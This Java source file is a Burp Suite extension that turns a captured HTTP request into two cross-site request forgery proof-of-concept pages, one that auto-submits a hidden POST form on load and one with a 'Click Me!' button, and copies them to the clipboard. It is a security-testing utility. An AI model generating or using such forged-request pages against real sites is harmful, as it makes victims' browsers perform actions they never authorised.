import burp.*;
import java.net.URL;
import java.util.*;
import java.util.regex.*;
import java.io.*;
import java.awt.*;
import javax.swing.*;
import java.awt.event.*;
import java.awt.datatransfer.*;

/**
Burp Extender allows third-party developers to extend the functionality of Burp Suite.
Extensions can read and modify Burp's runtime data and configuration, initiate key actions, and extend Burp's user interface.
**/
public class BurpExtender
{	

	public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks)
	{
		callbacks.registerMenuItem("create csrf PoC", new CreateCSRFPoC(callbacks));
	}
}

class CreateCSRFPoC implements IMenuItemHandler,ActionListener
{

	public IBurpExtenderCallbacks mCallbacks;
	public StringSelection CSRFCodeToCopy;
	public String autoSubmitCSRFTarget;
	public String manualSubmitCSRFTarget;
	public Button manualButton;
	public Button autoButton;
	
	public CreateCSRFPoC(IBurpExtenderCallbacks callbacks) 
	{
		mCallbacks = callbacks;
	}

	public void menuItemClicked(String menuItemCaption, IHttpRequestResponse[] messageInfo)
	{
		try {
			autoSubmitCSRFTarget = new String();
			manualSubmitCSRFTarget = new String();
			
			for (int i = 0; i < messageInfo.length; i++) {

				String target = messageInfo[i].getUrl().toString();
				autoSubmitCSRFTarget = "<html>\n";
				autoSubmitCSRFTarget += "<head>\n";
				autoSubmitCSRFTarget += "<script language=\"javascript\">\n";
				autoSubmitCSRFTarget += "function submitCSRF() {\n";
				autoSubmitCSRFTarget += "  document.csrf.submit();\n";
				autoSubmitCSRFTarget += "}\n";
				autoSubmitCSRFTarget += "</script>\n";
				autoSubmitCSRFTarget += "</head>\n";
				autoSubmitCSRFTarget += "<body onload=\"submitCSRF()\">\n";
				autoSubmitCSRFTarget += "<form action=\"" + target + "\" method=\"POST\" name=\"csrf\">\n";
				
				manualSubmitCSRFTarget = "<html>\n";
				manualSubmitCSRFTarget += "<body>\n";
				manualSubmitCSRFTarget += "<form action = \"" + target + "\" method = \"POST\">\n";
				

				byte[] request = messageInfo[i].getRequest();

				String[][] params = mCallbacks.getParameters(request);

				for(int j = 0; j < params.length; j++) {

					if(params[j][2].equals("body parameter"))
					{
						autoSubmitCSRFTarget += "<input type=\"hidden\" name=\""+params[j][0]+"\" value=\""+params[j][1]+"\" />\n";
						manualSubmitCSRFTarget += "<input type=\"hidden\" name=\""+params[j][0]+"\" value=\""+params[j][1]+"\">\n";
					}
				}

				autoSubmitCSRFTarget += "</form>\n";
				autoSubmitCSRFTarget += "</body>\n";
				autoSubmitCSRFTarget += "</html>\n";		
				
				manualSubmitCSRFTarget += "<input type=\"Submit\" value=\"Click Me!\" />";
				manualSubmitCSRFTarget += "</body>\n";
				manualSubmitCSRFTarget += "</html>\n";
				
			}
			
			/*
			 * Create the frame and the label, text area and button panels.
			 */
			JFrame frame = new JFrame("CSRF PoC");
			JPanel codePanel = new JPanel(new GridLayout(1,2));
			JPanel buttonPanel = new JPanel(new GridLayout(1, 2));
			JPanel labelPanel = new JPanel(new GridLayout(1, 2));
			
			JTextArea jt = new JTextArea(manualSubmitCSRFTarget,5,20);
			JScrollPane scrollPane = new JScrollPane(jt);
			jt.setEditable(false);	

			JTextArea ajt = new JTextArea(autoSubmitCSRFTarget,5,20);
			JScrollPane ascrollPane = new JScrollPane(ajt);
			ajt.setEditable(false);
			
			frame.add(codePanel, BorderLayout.CENTER);
			codePanel.add(scrollPane);
			codePanel.add(ascrollPane);
			
			/*
			 * Let's set up the copy buttons panel
			 */
			manualButton = new Button("Copy to clipboard"); 
			buttonPanel.add(manualButton); 
			autoButton = new Button("Copy to clipboard"); 
			buttonPanel.add(autoButton); 
			frame.add(buttonPanel, BorderLayout.SOUTH);
			
			manualButton.addActionListener(this);
			autoButton.addActionListener(this);
			
			frame.setSize(250,200);
			frame.setVisible(true);
			frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);

		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public void actionPerformed(ActionEvent e)
	{
		Toolkit toolkit = Toolkit.getDefaultToolkit();
		Clipboard clipboard = toolkit.getSystemClipboard();
		
		if (e.getSource() == manualButton)  
        {  
			CSRFCodeToCopy = new StringSelection(manualSubmitCSRFTarget);       
        }  
		if (e.getSource() == autoButton)  
        {  
			CSRFCodeToCopy = new StringSelection(autoSubmitCSRFTarget);  
        }  
		clipboard.setContents(CSRFCodeToCopy, CSRFCodeToCopy);
	}

	public void windowClosing(WindowEvent e) {}
	public void windowOpened(WindowEvent e) {}
	public void windowActivated(WindowEvent e) {}
	public void windowIconified(WindowEvent e) {}
	public void windowDeiconified(WindowEvent e) {}
	public void windowDeactivated(WindowEvent e) {}
	public void windowClosed(WindowEvent e) {}

}
